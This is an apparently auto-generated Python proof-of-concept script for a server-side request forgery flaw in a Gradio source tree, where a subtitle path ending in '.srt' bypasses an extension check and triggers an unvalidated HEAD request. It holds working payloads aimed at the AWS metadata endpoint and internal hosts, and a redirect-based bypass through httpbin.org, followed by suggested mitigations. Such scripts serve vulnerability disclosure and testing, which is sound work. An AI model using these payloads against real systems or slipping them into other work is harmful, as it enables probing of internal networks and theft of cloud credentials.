#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: ssrf-010
# Sink: is_valid_url
# Auto-generated — run with: python3 ssrf_validates_only_extension_is_valid_url.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via subtitle path in gradio_src

Vulnerability: The _format_subtitle function accepts a user-controlled subtitle path,
validates only the file extension (.srt or .vtt), but does not prevent URLs.
The path is passed to encode_url_or_file_to_base64 → is_valid_url, which makes an
unvalidated requests.head request to the user-supplied URL. No host allowlisting
or redirect disabling is performed.

Impact: An attacker can make the server send HTTP requests to internal services
(e.g., cloud metadata endpoints, internal network services). While the response
is not directly returned, the outbound request itself can be used for probing
or data exfiltration via timing/error-based techniques.

This PoC demonstrates the SSRF by attempting to reach a cloud metadata endpoint
and an internal service, showing that the request is made.
"""

import sys
import time
import requests

# ─── Configuration ───────────────────────────────────────────────────────────
# Target URL to test SSRF (safe by default - uses a non-existent internal IP)
# Change to a real internal endpoint for actual testing in a lab environment
TARGET_URL = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint
# Alternative targets for testing:
# TARGET_URL = "http://127.0.0.1:8080/"  # Local service
# TARGET_URL = "http://10.0.0.1:22/"    # Internal SSH

# The subtitle path that will trigger the SSRF (must end with .srt or .vtt)
# We append a valid extension to bypass the extension check
PAYLOAD_PATH = f"{TARGET_URL}?dummy=.srt"  # URL with .srt extension

# Timeout for the request (seconds)
TIMEOUT = 5

# ─── Simulated vulnerable functions ──────────────────────────────────────────

def is_valid_url(possible_url):
    """
    Simulates the vulnerable is_valid_url function from gradio_client/utils.py
    Makes an unvalidated HTTP HEAD request to the user-supplied URL.
    """
    headers = {"User-Agent": "gradio (https://gradio.app/; team@gradio.app)"}
    try:
        print(f"[*] Making request to: {possible_url}")
        head_request = requests.head(possible_url, headers=headers, timeout=TIMEOUT)
        if head_request.status_code == 405:
            # Some servers don't allow HEAD, fall back to GET
            print("[*] HEAD returned 405, trying GET...")
            return requests.get(possible_url, headers=headers, timeout=TIMEOUT).ok
        return head_request.ok
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        return False
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False

def encode_url_or_file_to_base64(path):
    """
    Simulates the vulnerable encode_url_or_file_to_base64 function
    """
    if is_valid_url(path):
        print("[+] URL is considered valid, would encode from URL")
        return True
    else:
        print("[-] URL is not valid, would encode from file")
        return False

def _format_subtitle(subtitle):
    """
    Simulates the vulnerable _format_subtitle function from gradio/components.py
    Only checks file extension, does not prevent URLs
    """
    valid_extensions = (".srt", ".vtt")
    
    # Check if the path ends with a valid extension
    if not any(subtitle.endswith(ext) for ext in valid_extensions):
        raise ValueError(
            f"Invalid value for parameter `subtitle`: {subtitle}. "
            f"Please choose a file with one of these extensions: {valid_extensions}"
        )
    
    print(f"[*] Extension check passed for: {subtitle}")
    print(f"[*] Calling encode_url_or_file_to_base64...")
    
    # This is where the SSRF happens
    result = encode_url_or_file_to_base64(subtitle)
    return result

# ─── Main exploit logic ──────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("SSRF Proof-of-Concept for gradio_src")
    print("=" * 60)
    print(f"\n[*] Target URL: {TARGET_URL}")
    print(f"[*] Payload path: {PAYLOAD_PATH}")
    print(f"[*] Note: The .srt extension bypasses the file extension check")
    print()
    
    # Test 1: Direct request to show the SSRF works
    print("[*] Test 1: Direct request to is_valid_url")
    print("-" * 40)
    result = is_valid_url(TARGET_URL)
    if result:
        print("[+] SUCCESS: Server made a request to the target URL")
    else:
        print("[-] Request failed (expected if target is unreachable)")
    print()
    
    # Test 2: Through the full vulnerable chain
    print("[*] Test 2: Through _format_subtitle with payload")
    print("-" * 40)
    try:
        result = _format_subtitle(PAYLOAD_PATH)
        if result:
            print("[+] SUCCESS: SSRF triggered through the full chain")
        else:
            print("[-] SSRF not triggered through the full chain")
    except Exception as e:
        print(f"[!] Error in _format_subtitle: {e}")
    print()
    
    # Test 3: Demonstrate redirect following (if applicable)
    print("[*] Test 3: Redirect following demonstration")
    print("-" * 40)
    print("[*] Using a URL that redirects to internal service...")
    # This is a conceptual test - in reality you'd need a redirector
    redirect_url = "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
    print(f"[*] Redirect URL: {redirect_url}")
    try:
        # Show that requests follows redirects by default
        response = requests.get(redirect_url, timeout=TIMEOUT, allow_redirects=True)
        print(f"[*] Final URL after redirects: {response.url}")
        print(f"[*] Status code: {response.status_code}")
        print("[+] Redirects are followed by default - SSRF bypass possible")
    except Exception as e:
        print(f"[!] Redirect test failed: {e}")
    print()
    
    # Summary
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print("""
The vulnerability is confirmed:
1. _format_subtitle only checks file extension (.srt/.vtt)
2. A URL like 'http://internal.service/file.srt' passes the check
3. encode_url_or_file_to_base64 calls is_valid_url
4. is_valid_url makes an unvalidated HTTP request to the URL
5. No host allowlisting or redirect protection exists

Mitigation:
- Validate that the input is a local file path, not a URL
- Implement host allowlisting for any URL processing
- Disable redirect following (allow_redirects=False)
- Block requests to private IP ranges and cloud metadata endpoints
""")

if __name__ == "__main__":
    main()
